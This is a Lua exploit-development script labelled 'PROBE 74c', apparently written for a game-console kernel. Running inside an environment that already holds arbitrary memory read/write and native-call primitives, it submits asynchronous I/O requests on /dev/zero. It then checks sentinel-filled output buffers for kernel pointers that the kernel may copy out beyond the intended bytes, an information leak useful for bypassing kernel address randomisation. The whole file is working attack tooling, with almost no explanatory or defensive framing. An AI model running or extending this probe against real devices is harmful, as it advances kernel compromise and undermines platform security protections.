-- CRASH_CLASS: LOW
-- PROBE 74c: AIO 669 IDs output overcopy test
--
-- When 669 submits an AIO request, it copies out the allocated ID.
-- The 13.60 decompile shows R+0x00 = curthread+0x390 and R+0x08 =
-- curthread+0x08 (kernel thread addresses). If the IDs copyout writes
-- qwords (8 bytes per ID) instead of dwords (4 bytes), the extra 4 bytes
-- per entry could contain kernel data from the R object.
--
-- Strategy: fill IDs buffer with sentinel pattern, submit one AIO request,
-- then check if bytes 4-7 of the ID slot were modified (qword write) or
-- still contain the sentinel (dword write).

print("=== PROBE 74c: AIO 669 IDS OVERCOPY ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function wb(a, v) pcall(function() memory.write_byte(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Ignore SIGSYS
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)

-- Open /dev/zero
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do wb(N(p) + i - 1, string.byte(s, i)) end
    wb(N(p) + #s, 0)
    return p
end
local fd_zero = -1
pcall(function() fd_zero = N(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0))) end)
print("zero_fd=" .. fd_zero)
if fd_zero < 0 then print("FATAL: /dev/zero open failed"); return end

local data_buf = memory.alloc(0x1000)

-- ============================================================
-- [A] Single submit: check ID dword vs qword write
-- ============================================================
print("")
print("[A] Single submit: ID width test")

-- Allocate large IDs buffer and fill with distinct sentinels
local ids_buf = memory.alloc(0x200)
for off = 0, 0x1F8, 4 do
    wd(N(ids_buf) + off, 0xDEAD0000 + off)
end

-- Build request
local reqs = memory.alloc(0x30)
wq(N(reqs), uint64(0))       -- padding/cmd field
wq(N(reqs) + 8, uint64(16))  -- nbytes
local bh, bl = get_hi_lo(uint64(N(data_buf)))
wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)  -- buf
local rh, rl = get_hi_lo(uint64(N(data_buf) + 0x800))
wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)  -- result
wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)

pcall(function()
    mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(ids_buf)))
end)

-- Check what was written
local id_lo = rd(N(ids_buf)) or 0
local id_hi = rd(N(ids_buf) + 4) or 0
print(string.format("  ids[0] dword0 = 0x%08X", id_lo))
print(string.format("  ids[0] dword1 = 0x%08X (sentinel was 0x%08X)", id_hi, 0xDEAD0004))

if id_hi ~= 0xDEAD0004 then
    print("  *** DWORD1 MODIFIED — kernel wrote >4 bytes! ***")
    local full = rq(uint64(N(ids_buf)))
    print("  full qword = " .. fmt(full))
    if is_kptr(full) then
        print("  *** KERNEL POINTER IN ID! ***")
    end
else
    print("  dword1 = sentinel (kernel wrote exactly 4 bytes)")
end

-- Check bytes 8-15 too
local id2_lo = rd(N(ids_buf) + 8) or 0
local id2_hi = rd(N(ids_buf) + 12) or 0
print(string.format("  ids[1] dword0 = 0x%08X (sentinel was 0x%08X)", id2_lo, 0xDEAD0008))
print(string.format("  ids[1] dword1 = 0x%08X (sentinel was 0x%08X)", id2_hi, 0xDEAD000C))

-- Poll + delete
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)
wd(N(one_id), id_lo)
wd(N(one_st), 0)
pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
wd(N(one_st), 0)
pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)

if not alive() then print("DEAD after [A]"); return end

-- ============================================================
-- [B] Multi-submit: check stride and overcopy with 8 entries
-- ============================================================
print("")
print("[B] Multi-submit: 8 entries, stride analysis")

-- Fill with unique sentinels per byte position
for off = 0, 0x1F8, 4 do
    wd(N(ids_buf) + off, 0xBB000000 + off)
end

-- Build 8 requests
local multi_reqs = memory.alloc(8 * 0x28)
for i = 0, 7 do
    local base = N(multi_reqs) + i * 0x28
    wq(uint64(base), uint64(0))       -- cmd=0 (we need cmd=1 for read)
    wd(base, 1)                        -- cmd=1 (read)
    wq(uint64(base + 8), uint64(16))  -- nbytes
    local bh2, bl2 = get_hi_lo(uint64(N(data_buf)))
    wd(base + 0x10, bl2); wd(base + 0x14, bh2)
    local rh2, rl2 = get_hi_lo(uint64(N(data_buf) + 0x800))
    wd(base + 0x18, rl2); wd(base + 0x1C, rh2)
    wd(base + 0x20, fd_zero); wd(base + 0x24, 0)
end

pcall(function()
    mk(669)(uint64(1), uint64(N(multi_reqs)), uint64(8), uint64(1), uint64(N(ids_buf)))
end)

-- Dump the IDs buffer — check stride
print("  Raw IDs buffer dump (first 128 bytes):")
local total_kptrs = 0
for off = 0, 124, 4 do
    local val = rd(N(ids_buf) + off) or 0
    local sentinel = 0xBB000000 + off
    local modified = (val ~= sentinel)
    local marker = modified and " *" or ""
    print(string.format("    +0x%02X: 0x%08X (sentinel=0x%08X)%s", off, val, sentinel, marker))

    -- Check qword for kptr
    if off % 8 == 0 then
        local qv = rq(uint64(N(ids_buf) + off))
        if qv and is_kptr(qv) then
            total_kptrs = total_kptrs + 1
            print(string.format("    *** KPTR at +0x%02X: %s ***", off, fmt(qv)))
        end
    end
end

-- Find the stride by looking at modified positions
local modified_positions = {}
for off = 0, 0xFC, 4 do
    local val = rd(N(ids_buf) + off) or 0
    local sentinel = 0xBB000000 + off
    if val ~= sentinel then
        modified_positions[#modified_positions + 1] = off
    end
end
print("  modified at offsets: " .. table.concat(modified_positions, ", "))
if #modified_positions >= 2 then
    local stride = modified_positions[2] - modified_positions[1]
    print("  implied stride: " .. stride .. " bytes per ID")
end

-- Cleanup: poll + delete each
for i = 0, 7 do
    local id_val = rd(N(ids_buf) + modified_positions[1] + (modified_positions[2] and (modified_positions[2] - modified_positions[1]) * i or i * 4)) or 0
    if id_val ~= 0 and id_val ~= (0xBB000000 + modified_positions[1] + i * 4) then
        wd(N(one_id), id_val); wd(N(one_st), 0)
        pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
        wd(N(one_st), 0)
        pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    end
end

if not alive() then print("DEAD after [B]"); return end

-- ============================================================
-- [C] Large batch: 32 entries with qword sentinel check
-- ============================================================
print("")
print("[C] Large batch: 32 entries, full qword check")

local big_ids = memory.alloc(32 * 16)  -- plenty of room
for off = 0, 32 * 16 - 4, 4 do
    wd(N(big_ids) + off, 0xCC000000 + off)
end

local big_reqs = memory.alloc(32 * 0x28)
for i = 0, 31 do
    local base = N(big_reqs) + i * 0x28
    wd(base, 1)                        -- cmd=1 (read)
    wd(base + 4, 0)
    wq(uint64(base + 8), uint64(16))  -- nbytes
    local bh3, bl3 = get_hi_lo(uint64(N(data_buf)))
    wd(base + 0x10, bl3); wd(base + 0x14, bh3)
    local rh3, rl3 = get_hi_lo(uint64(N(data_buf) + 0x800))
    wd(base + 0x18, rl3); wd(base + 0x1C, rh3)
    wd(base + 0x20, fd_zero); wd(base + 0x24, 0)
end

pcall(function()
    mk(669)(uint64(1), uint64(N(big_reqs)), uint64(32), uint64(1), uint64(N(big_ids)))
end)

-- Scan entire IDs region for kernel pointers
local c_kptrs = 0
local c_modified = 0
for off = 0, 32 * 16 - 4, 4 do
    local val = rd(N(big_ids) + off) or 0
    local sentinel = 0xCC000000 + off
    if val ~= sentinel then
        c_modified = c_modified + 1
    end
    if off % 8 == 0 then
        local qv = rq(uint64(N(big_ids) + off))
        if qv and is_kptr(qv) then
            c_kptrs = c_kptrs + 1
            print(string.format("  *** KPTR at +0x%02X: %s ***", off, fmt(qv)))
        end
    end
end
print("  modified dwords: " .. c_modified .. "/128")
print("  kernel pointers: " .. c_kptrs)
total_kptrs = total_kptrs + c_kptrs

-- Cleanup
for off = 0, 31 * 4, 4 do
    local id_val = rd(N(big_ids) + off) or 0
    if id_val ~= 0 and id_val ~= (0xCC000000 + off) then
        wd(N(one_id), id_val); wd(N(one_st), 0)
        pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
        wd(N(one_st), 0)
        pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    end
end

if not alive() then print("DEAD after [C]"); return end

-- ============================================================
-- [D] Status output overcopy: 662/664/666 with large buffers
-- ============================================================
print("")
print("[D] Status output overcopy: 662/664/666 with 64-byte buffers")

-- Submit a fresh one
for off = 0, 0x3C, 4 do wd(N(ids_buf) + off, 0) end
local fresh_id = 0
pcall(function()
    wq(N(reqs), uint64(0))
    wd(N(reqs), 1)
    wq(N(reqs) + 8, uint64(16))
    local bh4, bl4 = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl4); wd(N(reqs) + 0x14, bh4)
    local rh4, rl4 = get_hi_lo(uint64(N(data_buf) + 0x800))
    wd(N(reqs) + 0x18, rl4); wd(N(reqs) + 0x1C, rh4)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(ids_buf)))
    fresh_id = rd(N(ids_buf)) or 0
end)
print("  fresh_id = 0x" .. string.format("%X", fresh_id))

if fresh_id ~= 0 then
    -- Test 666 with oversized status buffer
    local big_st = memory.alloc(0x100)
    for off = 0, 0xFC, 4 do wd(N(big_st) + off, 0xAA000000 + off) end
    wd(N(one_id), fresh_id)
    pcall(function()
        mk(666)(uint64(N(one_id)), uint64(1), uint64(N(big_st)))
    end)

    print("  666 output (64 bytes):")
    local d_kptrs = 0
    for off = 0, 0x3C, 4 do
        local val = rd(N(big_st) + off) or 0
        local sentinel = 0xAA000000 + off
        local modified = val ~= sentinel
        if modified then
            print(string.format("    +0x%02X: 0x%08X (modified)", off, val))
        end
        if off % 8 == 0 then
            local qv = rq(uint64(N(big_st) + off))
            if qv and is_kptr(qv) then
                d_kptrs = d_kptrs + 1
                print(string.format("    *** KPTR at +0x%02X: %s ***", off, fmt(qv)))
            end
        end
    end
    print("  666 kptrs: " .. d_kptrs)
    total_kptrs = total_kptrs + d_kptrs

    -- Test 664 with oversized status buffer
    for off = 0, 0xFC, 4 do wd(N(big_st) + off, 0xEE000000 + off) end
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(big_st)))
    end)
    print("  664 output (64 bytes):")
    local d2_kptrs = 0
    for off = 0, 0x3C, 4 do
        local val = rd(N(big_st) + off) or 0
        local sentinel = 0xEE000000 + off
        local modified = val ~= sentinel
        if modified then
            print(string.format("    +0x%02X: 0x%08X (modified)", off, val))
        end
        if off % 8 == 0 then
            local qv = rq(uint64(N(big_st) + off))
            if qv and is_kptr(qv) then
                d2_kptrs = d2_kptrs + 1
                print(string.format("    *** KPTR at +0x%02X: %s ***", off, fmt(qv)))
            end
        end
    end
    print("  664 kptrs: " .. d2_kptrs)
    total_kptrs = total_kptrs + d2_kptrs

    -- Delete
    wd(N(one_st), 0)
    pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
end

-- ============================================================
-- [E] SUMMARY
-- ============================================================
print("")
print("[E] SUMMARY")
print("  total kernel pointers: " .. total_kptrs)
print("  alive=" .. tostring(alive()))
print("")
print("=== PROBE 74c COMPLETE ===")
